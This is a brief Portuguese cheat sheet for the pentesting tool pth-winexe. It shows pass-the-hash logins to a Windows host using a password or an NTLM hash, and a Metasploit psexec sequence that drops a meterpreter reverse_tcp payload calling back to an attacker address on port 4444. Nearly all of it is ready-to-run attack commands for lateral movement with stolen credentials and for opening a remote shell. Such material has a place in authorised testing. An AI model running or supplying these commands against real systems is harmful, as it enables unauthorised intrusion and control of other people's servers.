# PTH-WINEXE

O **PTH-WINEXE** é uma ferramenta para acessar um servidor Windows usando o conceito de Pass The Hash, ou seja, sem a necessidade de quebrar um hash obtido para ter acesso privilegiado ao servidor.

---

Acesso com credencial de usuário:

```bash
pth-winexe -U usuario%senha //192.168.0.100 cmd
```

---

Acesso com hash do usuário:

```bash
pth-winexe -U usuario%C1C2C3C4A1A2A3A4A5A6A7A8D8D5D3D2:2A3A4A5A6A7A8D8D5D3D2 //192.168.0.100 cmd
```

---

Podemos também efetuar o mesmo processo através do MSF:

```msf
msf > use exploit/windows/smb/psexec  
msf exploit(psexec) > set RHOST 192.168.0.100  
msf exploit(psexec) > set SMBUser usuario  
msf exploit(psexec) > set SMBPass senha(pode ser o hash também)  
msf exploit(psexec) > set SMBDomain dominio  
msf exploit(psexec) > set payload windows/x64/meterpreter/reverse_tcp  
msf exploit(psexec) > set LHOST 192.168.0.101  
msf exploit(psexec) > set LPORT 4444  
msf exploit(psexec) > exploit
```
